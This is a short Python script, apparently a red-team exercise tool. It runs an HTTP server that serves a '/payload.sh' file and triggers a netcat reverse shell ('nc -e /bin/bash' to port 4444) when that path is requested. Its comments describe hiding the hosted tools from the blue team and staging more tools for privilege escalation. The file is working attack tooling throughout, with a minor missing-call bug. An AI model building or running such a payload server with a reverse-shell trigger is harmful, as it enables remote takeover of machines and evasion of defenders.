from http.server import SimpleHTTPRequestHandler, HTTPServer
import subprocess

class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        allowed_files=['/payload.sh'] #only specific filles are allowed to be accessed via IP so even if blue team tries to look at the site hosting tools they have to know which dirs are allowed to be accessed 
        #hopefully this web server will host other tools that can be gotten through the curl command and used for further priv escalation purposes

        if self.path in allowed_files:
            if self.path == '/payload.sh': #checks if desired path is to the payload then starts reverse shell via netcat
                self.execute_reverse_shell()
            super().do_GET()
        else:
            self.send_response(403)
            self.end_headers
            self.wfile.write(b'Access Denied')
        
    def execute_reverse_shell(self):
        print("[*] Triggering reverse shell...")

        reverse_shell_command = "nc -e /bin/bash 127.0.0.1 4444" #makes a connection back to the attacker machine who is listening 

        subprocess.Popen(reverse_shell_command, shell=True)
    

def run(server_class=HTTPServer, handler_class =CustomHTTPRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()


if __name__ == '__main__':
    run()